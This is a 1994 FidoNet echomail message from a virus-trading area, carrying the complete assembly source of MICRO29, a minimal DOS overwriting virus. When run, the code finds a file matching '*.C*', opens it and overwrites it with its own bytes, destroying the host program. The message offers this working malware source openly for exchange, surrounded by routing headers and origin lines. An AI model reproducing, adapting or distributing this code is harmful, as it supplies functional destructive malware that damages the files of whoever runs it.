;ฤ PVT.VIRII (2:465/65.4) ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ PVT.VIRII ฤ
; Msg  : 1 of 63
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:08
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : MICRO29.ASM
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
;.RealName: Max Ivanov
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ญไฎpฌ ๆจ๏ ฎ ขจpใแ ๅ)
;* From : Gilbert Holleman, 2:283/718 (06 Nov 94 16:01)
;* To   : Clif Jessop
;* Subj : MICRO29.ASM
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Gilbert.Holleman@f718.n283.z2.fidonet.org
; #############################################################################
; ###                                                                       ###
; ###                             M i C R O   29                            ###
; ###                                                                       ###
; ###                                  By                                   ###
; ###                                                                       ###
; ###                      Dreamer / Demoralized Youth                      ###
; ###                                                                       ###
; #############################################################################
segment code
org 100h
begin:        MOV     AH,4Eh                  ;Dos Universal:  FIND FIRST
        MOV     DX,OFFSET PATT
        INT     21h
        MOV     AX,3D02h                ;Dos Universal:  OPEN HANDLE
        MOV     DX,9Eh
        INT     21h
        XCHG    AX,BX
        MOV     AH,40h                  ;Dos Universal:  WRITE TO HANDLE
        ADD     DX,62h
        INT     21h
        RET

PATT    DB      '*.C*',0
code ends
end begin

;-+-  GEcho 1.00
; + Origin: <Rudy's Place - Israel> Hard disks never die... (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeยeO
;
;/uxxxx        Set version emulation, version xxxx
;
;--- Aidstest Null: /Kill
; * Origin: ๙PVT.ViRII๚main๚board๚ / Virus Research labs. (2:5030/136)

